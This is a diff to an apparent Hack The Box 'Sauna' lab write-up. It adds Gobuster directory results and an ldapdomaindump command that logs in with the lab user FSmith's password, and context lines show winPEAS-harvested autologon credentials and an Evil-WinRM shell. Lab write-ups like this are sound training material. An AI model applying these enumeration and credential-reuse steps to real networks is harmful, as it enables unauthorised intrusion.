@@ -151,6 +151,30 @@ We see the main website has several pages all with static content:
 
 ![ImgPlaceholder](screenshots/web-80-main.png)
 
+With Gobuster we find the following web directories:
+
+```
+/index.html (Status: 200)
+/images (Status: 301)
+/contact.html (Status: 200)
+/blog.html (Status: 200)
+/about.html (Status: 200)
+/Images (Status: 301)
+/css (Status: 301)
+/Contact.html (Status: 200)
+/About.html (Status: 200)
+/Index.html (Status: 200)
+/Blog.html (Status: 200)
+/fonts (Status: 301)
+/IMAGES (Status: 301)
+/INDEX.html (Status: 200)
+/Fonts (Status: 301)
+/single.html (Status: 200)
+/CSS (Status: 301)
+/CONTACT.html (Status: 200)
+/ABOUT.html (Status: 200)
+```
+
 There is a webpage with names:
 
 ```
@@ -354,11 +378,6 @@ The output of the command is located in the file winpeas.out in the github tree.
 One notable credential we find in the output is:
 
 ```
-
-The output of the command is located in the file winpeas.out in the github tree.
-One notable credential we find in the output is:
-
-```
 Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
     DefaultDomainName    REG_SZ    EGOTISTICALBANK
     DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
@@ -485,10 +504,16 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 *Evil-WinRM* PS C:\Users\FSmith\Documents>
 ```
 
-```
-user@kali:~/Downloads$ git clone https://github.com/fox-it/BloodHound.py
-```
+I dumped the ldap directory using ldapdomaindump:
 
+```
+user@kali:~/hackthebox/hackthebox/sauna/ldap$ ldapdomaindump -u 'EGOTISTICAL-BANK\FSmith' -p 'Thestrokes23' 10.10.10.175 
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished
+```
 
 ## Sample Report - Penetration
 
